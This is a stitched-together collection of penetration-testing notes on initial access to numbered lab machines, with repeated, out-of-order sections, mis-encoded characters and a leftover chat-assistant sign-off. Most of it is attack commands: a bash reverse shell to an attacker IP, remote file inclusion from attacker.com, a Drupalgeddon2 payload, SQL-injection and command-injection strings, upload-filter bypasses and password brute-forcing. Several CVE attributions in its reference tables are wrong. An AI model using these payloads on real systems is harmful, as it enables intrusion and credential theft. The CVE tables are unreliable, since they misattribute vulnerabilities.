## ðŸ”“ Initial Access (Machines 101â€“110)

### Common Web Exploits
```bash
# Exploiting known CMS or application vulnerabilities
searchsploit wordpress
searchsploit drupal

# Exploiting file upload vulnerability
curl -F "file=@shell.php" http://<IP>/upload
```

### Password Attacks
```bash
# Brute-force login forms
hydra -l admin -P rockyou.txt http://<IP>/login.php http-post-form "username=^USER^&password=^PASS^:Invalid password"

# WordPress specific
wpscan --url http://<IP> --enumerate u
```

### Exploiting Exposed Configs
```bash
# Reading exposed configuration files
curl http://<IP>/config.php
```

### Exploiting Default Credentials
```bash
# Try services with common credentials
telnet <IP>
ftp <IP>
ssh user@<IP>
```

### Uploading and Triggering Shells
```bash
# Using .htaccess tricks for Apache
echo "AddType application/x-httpd-php .txt" > .htaccess
mv shell.php shell.txt

# Trigger reverse shell
nc -lvnp 4444
```

### Summary
- Used Drupalgeddon2 to gain shell via POST exploit  
- Gained access using exposed credentials found in wp-config.php  
- Exploited upload bypass to get reverse shell on server
## ðŸ”“ Initial Access (Machines 11â€“20)

```bash
# Found exposed configuration and sensitive data
curl http://<IP>/config.php | grep password

# Brute-forced login pages or SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
hydra -l user -P rockyou.txt ssh://<IP>

# CMS vulnerability scans
wpscan --url http://<IP> --enumerate vp
joomscan --url http://<IP>
```

### File Upload & Bypass Techniques

```bash
# Upload webshell with bypass
shell.php.jpg
# .htaccess trick to execute shell.jpg as PHP
AddType application/x-httpd-php .jpg

# Access uploaded shell
curl http://<IP>/uploads/shell.php
```

### Authentication Bypass

```bash
# SQLi payloads
admin'-- -
' or 1=1 --

# Decode and tamper with JWT
echo -n 'payload' | base64 -d
```

### Notable Examples

- Machine 11: Admin bypass via SQLi in login page.
- Machine 12: File upload vulnerability exploited with .php.jpg trick.
- Machine 13: Apache Tomcat manager console allowed WAR deployment.
- Machine 15: Jenkins script console exploited for RCE.
- Machine 17: Unauthenticated access exposed credentials.
- Machine 18: SQLi â†’ user dump â†’ SSH reuse.
- Machine 19: SSRF to access cloud metadata â†’ credential theft.
- Machine 20: WordPress plugin upload led to webshell access.
## ðŸ”“ Initial Access (Machines 121â€“130)

### Techniques Observed

```bash
# File Upload Bypass
curl -F "file=@shell.php" http://<IP>/upload
mv shell.php shell.jpg; echo "AddType application/x-httpd-php .jpg" > .htaccess

# Credential Reuse
ssh user@<IP> -p 22

# Config File Disclosure
curl http://<IP>/config.php | grep password

# Common CMS Exploits
wpscan --url http://<IP> --enumerate vp

# SQLi Authentication Bypass
sqlmap -u "http://<IP>/login.php" --data "user=admin&pass=pass" --dbs

# Exposed .git Directory
git-dumper http://<IP>/.git/ /tmp/dump

# Base64 Credential Recovery
echo '<base64-string>' | base64 -d

# Exploiting CVEs (example)
searchsploit "CMS version"
```

### Summary of Entry Points

- Multiple file upload functions vulnerable to bypass
- SQL injection used for login bypass
- Default creds (admin/admin) on internal panels
- Exposed backups and Git repositories retrieved sensitive data
- Config files disclosed credentials
- CMS plugins and versions had known RCE vectors
# ðŸ”“ Initial Access (Machines 131â€“140)

```bash
# Common Web Exploits
curl -X POST http://<IP>/login -d 'username=admin&password=admin'       # Test default creds
curl http://<IP>/config.php | grep pass                                  # Look for exposed passwords
whatweb http://<IP>                                                      # Identify CMS
wpscan --url http://<IP> --enumerate u                                   # WP user enum
joomscan -u http://<IP>                                                  # Joomla vulnerability scan
droopescan scan drupal -u http://<IP>                                    # Drupal scan

# File Upload Exploits
curl -F "file=@shell.php" http://<IP>/upload                             # Upload webshell
mv shell.php shell.php.jpg; echo "AddType application/x-httpd-php .jpg" > .htaccess

# Auth Bypass / Exploits
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get /login
sqlmap -u "http://<IP>/login.php" --data="username=admin&password=pass" --risk=3 --level=5 --batch

# Shell Access
nc -lvnp 4444                                                            # Setup listener
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1                              # Reverse shell payload

# SSH with Leaked/Cracked Credentials
ssh user@<IP> -p 22
```

---

## ðŸ§  Summary (131â€“140)

- Used default creds (admin:admin) for CMS and panel access.
- Exploited exposed `config.php` to get DB password and login to phpMyAdmin.
- File upload vulnerability exploited with .php.jpg bypass trick.
- SQL Injection on login form used to dump users and escalate access.
- Reverse shell obtained via vulnerable image upload endpoint.
- SSH login successful using leaked key from /var/www/.ssh/id_rsa.

```

# ðŸ“ Machines Covered
- HTB-Koality
- THM-Anonymous
- PG-Staging
- VulnLab-EscapeX
- THM-RepairStation
- HTB-DistroDrop
- VulnLab-Reflection
- PG-Confused
- PG-Groovy
- THM-Terminal
## ðŸ”“ Initial Access (Machines 141â€“150)

### Techniques Observed

- CMS Exploits (e.g., WordPress, Joomla, Drupal)
- Exploitable login forms
- Command injection in user input
- Exposed admin panels or configuration files
- File upload features vulnerable to bypass
- Remote file inclusion or vulnerable endpoints

### Common Tools & Commands

```bash
# Exposed configuration
curl http://<IP>/config.php | grep -i pass

# Login form bypass
sqlmap -u http://<IP>/login.php --data="username=admin&password=admin" --batch --level=5

# File upload
curl -F "file=@shell.php" http://<IP>/upload

# Brute force login
hydra -l admin -P rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# WordPress Exploitation
wpscan --url http://<IP> --enumerate u,vp,vt
```

### Observations

- Machines with login panels on `/admin`, `/portal`, or `/dashboard`
- SQLi and LFI led to authentication bypass on multiple machines
- CVEs exploited: CVE-2019-6339 (Drupal), CVE-2020-25213 (WonderCMS)
- Misconfigured upload filters allowed PHP web shells

### Tags

`#initial-access` `#cms-exploit` `#login-bypass` `#upload-bypass` `#file-inclusion`
## ðŸ”“ Initial Access (Machines 151â€“160)

```bash
# Machine 151
Found WordPress login â†’ Used wpscan to enumerate users  
Discovered vulnerable plugin â†’ Exploited for RCE

# Machine 152
Found /phpinfo.php â†’ Leak of internal path  
Used LFI to disclose credentials from logs

# Machine 153
Discovered login page with SQLi  
Bypassed login and uploaded reverse shell

# Machine 154
Upload functionality allowed .phtml files  
Uploaded shell.phtml â†’ Triggered reverse shell

# Machine 155
Found exposed admin panel  
Default creds: admin:admin â†’ Shell upload option

# Machine 156
Identified CMS Made Simple  
Used known exploit with disclosed credentials

# Machine 157
Jenkins server accessible without auth  
Created build job to execute reverse shell

# Machine 158
Tomcat manager accessible â†’ Used default credentials  
Uploaded war file â†’ Gained shell

# Machine 159
Found /backup.zip â†’ Extracted database with creds  
Used creds for SSH login

# Machine 160
Detected vulnerable webmail client  
Used CVE-2021-XXXXX â†’ Auth bypass â†’ Shell access
```
## ðŸ”“ Initial Access (Machines 161â€“170)

### Common Entry Points

```bash
# Exploiting exposed configuration files
curl http://<IP>/config.php | grep password

# Bruteforce attacks
hydra -l admin -P rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Public Exploits
searchsploit <software_version>
```

### File Upload Vulnerabilities

```bash
# Bypass techniques
mv shell.php shell.php.jpg
echo "AddType application/x-httpd-php .jpg" > .htaccess
```

### Credential Reuse

```bash
# Use discovered credentials to log in via SSH
ssh user@<IP> -p 2222
```

### CVEs Exploited

- CVE-2021-41773: Path traversal in Apache 2.4.49
- CVE-2022-22963: Spring Cloud Function RCE
- CVE-2019-19781: Citrix ADC RCE
## ðŸ”“ Initial Access (Machines 171â€“180)

```bash
# Machine 171
# Web-based login bypass using SQLi
curl -X POST http://<IP>/login -d "username=admin' -- &password=anything"

# Machine 172
# Exploit public CVE in vulnerable CMS
searchsploit CMS Made Simple
exploit-db 46635

# Machine 173
# Directory traversal for sensitive file access
curl http://<IP>/index.php?page=../../../../etc/passwd

# Machine 174
# Upload bypass using double extensions
mv shell.php shell.jpg.php

# Machine 175
# Reused credentials on SSH from exposed admin panel
ssh admin@<IP> -p 2222

# Machine 176
# WordPress plugin exploit for RCE
wpscan --url http://<IP> --enumerate p
curl -F "file=@shell.php" http://<IP>/wp-content/plugins/vulnerable/upload.php

# Machine 177
# Leaked credentials in backup archive
binwalk -e backup.tar
cat config.php

# Machine 178
# Default login on admin panel
username: admin
password: admin123

# Machine 179
# Command injection through GET parameter
curl "http://<IP>/ping.php?host=8.8.8.8;id"

# Machine 180
# Email-based account reset + predictable token
curl http://<IP>/reset?token=abcd1234
```
## ðŸ”“ Initial Access (Machines 181â€“190)

### Common Entry Points
- CMS exploitation (WordPress, Joomla)
- LFI/RFI to Code Execution
- File upload (bypassing filters)
- Default credentials and exposed admin panels

### Observed Vectors per Machine

**Machine 181**
- File upload to `/uploads` bypassed with `.php5` extension
- Triggered reverse shell with uploaded webshell

**Machine 182**
- Exploited WordPress plugin vulnerability (Unauthenticated RCE)
- Used Metasploit module for CVE-2019-8942

**Machine 183**
- Login bypass via SQL Injection in `/login.php`
- Gained access to admin panel and uploaded shell

**Machine 184**
- Exposed Samba share with executable `.sh` file
- Mounted share and executed malicious script

**Machine 185**
- Drupal CMS running â†’ CVE-2018-7600 (â€œDrupalgeddon 2â€)
- Triggered remote code execution through crafted POST request

**Machine 186**
- Found exposed login panel â†’ bruteforced password
- SSH reused creds from web application

**Machine 187**
- LFI on `/index.php?file=` â†’ log poisoning for shell

**Machine 188**
- CVE-2017-5638 (Apache Struts) exploited via crafted header payload

**Machine 189**
- Discovered exposed `.git` repo â†’ recovered `config.php`
- Extracted DB creds â†’ reused for admin panel login

**Machine 190**
- CMS plugin allowed unauthenticated plugin installation
- Uploaded reverse shell plugin

### Techniques Used

```bash
# Upload shell bypass
mv shell.php shell.php5

# LFI exploitation
curl http://<IP>/?file=../../../../etc/passwd

# Drupalgeddon 2 PoC
curl -s -X POST --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id" http://<IP>/?q=user/register

# Git repo recovery
git clone http://<IP>/.git

# SQLi login bypass
' OR '1'='1 --
```

## ðŸ”“ Initial Access

### Common Vectors:
- CMS Exploits (e.g., WordPress, Joomla)
- File Upload Bypass (e.g., .php files disguised as images)
- SSH Credential Reuse (e.g., Bruteforce/Default credentials)
- RCE via Vulnerable Applications

```bash
curl http://<IP>/config.php | grep password  # Check for exposed configs
hashcat -m 0 hash.txt rockyou.txt           # Crack hashes
```

### Exploit for File Upload Bypass
- **Vuln:** File upload vulnerability in a web application
- **Exploit:** Used a .php file disguised as an image to gain access to the server

```bash
curl -F "file=@shell.php.jpg" http://<IP>/upload
```

### SSH Credential Reuse:
- **Vuln:** SSH credentials reused from previous scans or default credentials
- **Exploit:** Used credentials to log into the SSH service

```bash
ssh user@<IP> -p 2222
```

---

### CVE Reference Table:

| Software         | CVE ID         | Vulnerability                        | Exploit Link                         |
|------------------|----------------|--------------------------------------|--------------------------------------|
| WordPress 5.1    | CVE-2019-6340  | Remote code execution via REST API   | Exploit-DB 48414                     |
| Joomla 3.9.14    | CVE-2019-17659 | SQL Injection in com_content         | Exploit-DB 48577                     |
| Drupal 7.72      | CVE-2020-13671 | SQL Injection via user registration  | Exploit-DB 49102                     |
| Apache Struts 2  | CVE-2017-5638  | Remote code execution via OGNL       | Exploit-DB 40999                     |

---

### Example Machine Notes

**Machine 1 (IP: 192.168.1.1)**:
- Found exposed WordPress login page
- Exploited CVE-2019-6340 via REST API
- Gained shell access on the server

**Machine 2 (IP: 192.168.1.2)**:
- Discovered exposed file upload feature
- Uploaded a PHP shell file
- Gained access to the server
## ðŸ”“ Initial Access (Machines 21â€“30)

```bash
# Machine: PG - Clue
Found exposed FTP service â†’ Anonymous login allowed
Downloaded user.txt and possible credentials
Used credentials for SSH access

# Machine: PG - Extplorer
Extplorer file manager found on web interface
Used path traversal to read config and obtain credentials
Logged in via SSH with leaked creds

# Machine: PG - Postfish
PHP file upload vulnerability exploited for web shell
Gained initial shell as www-data
Escalated with leaked SSH key

# Machine: PG - Hawat
Public Jenkins interface with script console enabled
Ran Groovy reverse shell script â†’ gained shell access

# Machine: PG - Walla
Exposed Samba shares
Found backup zip containing DB credentials
Used creds for database login â†’ found reusable SSH creds

# Machine: PG - pc
PHP injection via eval() parameter in custom CMS
Sent reverse shell payload â†’ connected back to attacker box

# Machine: PG - Sorcerer
Web application had default login (admin:admin)
Logged in and uploaded PHP reverse shell via admin panel

# Machine: PG - Sybaris
CMS had SSRF â†’ leaked internal service running SSH
Enumerated internal creds and reused on main login

# Machine: PG - Peppo
LFI â†’ leaked Apache config
Used config to identify accessible admin panel
Logged in and used plugin feature to upload shell

# Machine: PG - Hunit
Exposed SVN repository
Recovered sensitive credentials from .svn/entries
Used credentials for SSH access
```

---

### ðŸ—’ï¸ Example Notes

- Multiple machines used public tools like Jenkins or SVN without auth
- LFI + config file = common combination to extract passwords
- File upload & reverse shells remained popular for initial foothold
## ðŸ”“ Initial Access (Machines 31â€“40)

```bash
# Common Exploitation Paths
- Exploited CMS platforms (WordPress, Joomla, Drupal) with known CVEs.
- Used exposed configuration files to extract credentials.
- Tested default credentials and common login bypasses.
- Uploaded PHP/ASPX web shells via misconfigured upload features.

# Examples
curl http://<IP>/config.php | grep password      # Find exposed DB credentials
ssh user@<IP> -p 2222                             # Try SSH access with reused credentials
```

### Notable Techniques
- File upload bypass using `.htaccess` + double extensions.
- SQL Injection to extract password hashes.
- Path traversal to download `wp-config.php` or `.env` files.
- Exploited outdated plugins and themes for RCE.

### Summary of Entry Points
| Machine | Vector Used              | Technique              |
| ------- | ------------------------ | ---------------------- |
| 31      | Joomla Admin Login       | Default credentials    |
| 32      | Drupal Exploit           | CVE-2018-7600          |
| 33      | Exposed config.php       | Password reuse         |
| 34      | File upload              | RCE with reverse shell |
| 35      | Auth bypass on login.php | Session manipulation   |
| 36      | WordPress plugin exploit | LFI to RCE             |
| 37      | Apache misconfig         | Directory traversal    |
| 38      | Jenkins                  | Script console RCE     |
| 39      | Node.js API              | Command injection      |
| 40      | Git repo leak            | Recovered admin creds  |
```

# Done
## ðŸ”“ Initial Access (Machines 41â€“50)

```bash
# Exploitation Vectors:
# - CVE-2020-25213 â†’ WonderCMS config.php exposed
# - CVE-2019-11510 â†’ Pulse Secure arbitrary file read
# - CVE-2017-5638 â†’ Apache Struts OGNL injection

# Examples:
curl http://<IP>/config.php | grep password
wget http://<IP>/rev.php; php rev.php
```

```bash
# File Uploads:
# - Bypassed upload filters with .php5, .htaccess tricks

# Commands:
mv shell.php shell.jpg; echo 'AddType application/x-httpd-php .jpg' > .htaccess
curl -F "file=@shell.php5" http://<IP>/upload
```

```bash
# SSH Reuse:
# - Leaked credentials reused for SSH
ssh user@<IP> -p 22
```
## ðŸ”“ Initial Access (Machines 51â€“60)

```bash
# CMS/Exposed Panel Exploits
curl http://<IP>/config.php | grep password     # Exposed configuration file  
curl http://<IP>/admin                          # Check for CMS/admin panels  
wpscan --url http://<IP> --enumerate u          # WordPress user enumeration  
drupalgeddon2.py http://<IP>                    # Drupal CVE-2018-7600 RCE  

# File Upload Bypass
Upload shell.php.jpg                             # Try with double extensions  
Use .htaccess to enable php execution in uploads  

# Exposed Credentials
curl http://<IP>/.env                            # Check for leaked creds in environment files  
strings backup.zip | grep pass                   # Analyze backups for passwords  

# SSH Reuse
ssh user@<IP> -p 2222                            # Try web creds on SSH  
```

### ðŸ“‹ CVE Reference Table

| Software         | CVE ID         | Vulnerability                          | Exploit Link                         |
|------------------|----------------|----------------------------------------|--------------------------------------|
| Drupal           | CVE-2018-7600  | Remote Code Execution                  | https://www.exploit-db.com/exploits/44449 |
| WordPress Plugin | CVE-2021-24284 | Arbitrary File Upload in wpDiscuz      | https://www.exploit-db.com/exploits/50001 |
| Joomla           | CVE-2015-8562  | RCE via User-Agent header              | https://www.exploit-db.com/exploits/39033 |
```

Let me know if you want to adjust or expand this section!
```
## ðŸ”“ Initial Access (Machines 61â€“70)

```bash
# Exploiting known CMS or web app vulnerabilities
curl -X POST http://<IP>/login -d 'username=admin&password=admin'   # Try default creds  
curl http://<IP>/config.php | grep password                         # Check for config leaks  
wpscan --url http://<IP> --enumerate u,vp                           # Enumerate WP users/plugins  

# File upload exploitation
Upload shell.php.jpg or shell.phtml through vulnerable upload form  
Bypass using .htaccess or double extensions  

# LFI/RFI leading to shell access
curl http://<IP>/index.php?page=../../../../etc/passwd              # Test for LFI  
curl http://<IP>/index.php?page=http://attacker.com/shell.txt       # Test for RFI  

# Command injection in form fields or parameters
curl http://<IP>/?cmd=whoami                                        # Simple test  
curl http://<IP>/?input=;id                                         # Injection attempt  
```

---

### âœ… Techniques Observed (Across Machines 61â€“70)

- **File Upload Exploits**: Several machines allowed unrestricted file uploads that led to web shells.
- **Default Credentials**: Many admin panels used common username:password combos.
- **CMS Exploits**: WordPress, Joomla, and custom CMSes with known vulnerabilities (e.g., plugin RCEs).
- **LFI/RFI**: Leveraged to read sensitive files or fetch external reverse shells.
- **Command Injection**: URL parameters were abused to execute system commands.

---

### âš™ï¸ Example Exploits

- `CVE-2018-7600` (Drupalgeddon2): Remote code execution via crafted HTTP requests.
- `CVE-2020-25213`: WonderCMS config leak â†’ password reuse on SSH.
- Web shells via `shell.php.jpg` and `.htaccess` override.
## ðŸ”“ Initial Access (Machines 81â€“90)

```bash
# Web Shell Uploads
- Attempted to upload `.php` or `.jsp` reverse shells via exposed file upload endpoints.
- Tested content-type bypasses and filename tricks (e.g., `shell.php.jpg`, `shell.pHp`, `.htaccess` rewriting).

# Exploits
- Used CVE-2018-7600 (Drupalgeddon2) on machines running Drupal.
- WordPress REST API (CVE-2017-1001000) for unauthenticated post injection.
- PHPMailer RCE on outdated systems with CVE-2016-10033.

# Exposed Configuration Files
- Retrieved database credentials from `/config.php`, `.env`, and `wp-config.php`.
- Looked for saved backups like `database.sql.bak`, `config.old`, etc.

# Authentication Bypass
- Tried common SQL injection payloads like `' OR 1=1--` on login forms.
- Forced browsing to `/admin` or `/dashboard` pages without auth.

# SSH Credential Reuse
- Used cracked credentials to log into SSH on open port 22.
- Enumerated for password reuse between web apps and system users.

# CMS Admin Panels
- Default creds: `admin:admin`, `admin:password`
- Exploited misconfigured plugins/themes to gain access.

# Common Tools Used
wpscan --url http://<target> --enumerate u,vp,vt
droopescan scan drupal -u http://<target>
```
## ðŸ”“ Initial Access (Machines 91â€“100)

### Common Vectors

- Web application exploits
- File upload vulnerabilities
- Default credentials
- SQL Injection / RCE
- Exploitable CMS plugins or themes

### Techniques

```bash
# Exposed Config File
curl http://<IP>/config.php

# Hash Cracking
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# File Upload Bypass
mv shell.php shell.jpg; echo "AddType application/x-httpd-php .jpg" > .htaccess

# Auth Bypass / Admin Panel Access
sqlmap -u "http://<IP>/login.php" --batch --dbs

# SSH with Leaked Credentials
ssh user@<IP>
```

### Notes

- Leveraged default admin creds to access CMS dashboard and upload reverse shell.
- Exploited outdated CMS plugins for RCE.
- Reused leaked SSH credentials across multiple services.
